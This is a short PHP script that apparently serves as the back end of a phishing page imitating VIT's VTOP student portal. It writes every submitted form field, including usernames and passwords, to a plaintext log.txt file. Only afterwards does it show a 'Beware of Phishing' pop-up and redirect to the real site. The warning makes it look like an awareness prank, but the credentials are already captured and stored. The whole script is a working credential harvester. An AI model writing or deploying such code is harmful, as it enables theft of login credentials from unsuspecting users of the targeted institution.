<?php
$handle=fopen("log.txt","a");
foreach($_POST as $variable => $value)
{
	fwrite ($handle,$variable);
	fwrite ($handle,"=");
	fwrite ($handle,$value);
	fwrite ($handle,"\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
echo "<script> if (confirm('Beware of Phishing, Change your VTOP Password ASAP!!')) {window.location = 'https://vtop.vit.ac.in/';} </script>";
exit;
?>